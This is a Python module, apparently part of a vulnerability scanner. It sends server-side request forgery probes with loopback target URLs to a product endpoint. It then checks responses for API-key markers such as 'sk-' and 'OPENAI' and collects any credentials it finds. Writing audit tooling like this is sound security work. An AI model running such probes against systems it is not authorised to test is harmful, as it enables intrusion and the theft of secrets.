"""L2 SSRF — trigger product server-side fetch with fixed audited target URLs.

No arbitrary user-controlled URLs, no full port scans.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from .common import EngineResult, make_finding

if TYPE_CHECKING:
    from ..base import Prober
    from ..capability.spec import ProbeSpec
    from ..capability.types import ProbeContext

# Hardcoded safe targets only — never accept external URL input.
_DEFAULT_TARGETS = (
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
)


async def run_ssrf(
    prober: Prober,
    ctx: ProbeContext,
    spec: ProbeSpec,
) -> EngineResult:
    entry = spec.entry
    origin = prober._url(ctx.hit)
    result = EngineResult()
    before = prober.budget_consumed

    trigger_path = entry.get("path") or entry.get("trigger_path") or ""
    method = (entry.get("method") or "POST").upper()
    url_param = entry.get("url_param") or "url"
    body_template: dict[str, Any] = dict(entry.get("body") or {})
    targets = list(entry.get("target_urls") or _DEFAULT_TARGETS)[:3]
    headers: dict[str, str] = {}
    if entry.get("use_auth", False) and ctx.auth_headers:
        headers = dict(ctx.auth_headers)

    if not trigger_path:
        result.reason = "no SSRF trigger path"
        return result

    marker_keys = list(
        entry.get("success_markers") or ["127.0.0.1", "localhost", "OPENAI", "api_key", "sk-"]
    )

    for target_url in targets:
        if result.requests_used >= spec.max_requests:
            break
        url = prober._url(ctx.hit, trigger_path)
        body = dict(body_template)
        body[url_param] = target_url
        if method == "GET":
            resp = await prober._get(url, params={url_param: target_url}, headers=headers or None)
        else:
            resp = await prober._post(url, json=body, headers=headers or None)
        result.requests_used = prober.budget_consumed - before
        if resp is None:
            continue
        text = resp.text or ""
        found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_ssrf")
        result.credentials.extend(found)
        marker_hit = any(m.lower() in text.lower() for m in marker_keys)
        if found or (resp.status_code == 200 and marker_hit and len(text) > 20):
            result.findings.append(
                make_finding(
                    vuln_class=spec.vuln_class,
                    product=spec.product,
                    target_origin=origin,
                    spec_id=spec.id,
                    cve_ids=spec.cve_ids,
                    confirmed=True,
                    summary=f"SSRF trigger {trigger_path} returned evidence for {target_url}",
                    severity="high",
                    credentials=found,
                    evidence={
                        "trigger": trigger_path,
                        "target": target_url,
                        "status": resp.status_code,
                    },
                )
            )
            break

    if not result.findings:
        result.reason = "ssrf not confirmed"
    return result
